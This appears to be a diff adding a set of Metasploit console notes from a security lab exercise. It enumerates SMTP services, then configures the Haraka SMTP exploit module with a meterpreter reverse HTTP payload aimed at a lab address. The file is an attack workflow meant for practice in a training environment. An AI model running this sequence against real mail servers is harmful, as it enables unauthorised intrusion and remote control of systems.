@@ -1,0 +1,14 @@
+msfconsole
+
+workspace -a smb_enum
+
+setg RHOSTS
+
+auxiliary/scanner/smtp/smtp_version
+auxiliary/scanner/smtp/smtp_enum
+
+exploit/linux/smtp/haraka
+set SRVPORT 9898
+set email_to root@attackdefense.test
+set payload linux/x64/meterpreter_reverse_http
+set LHOST 
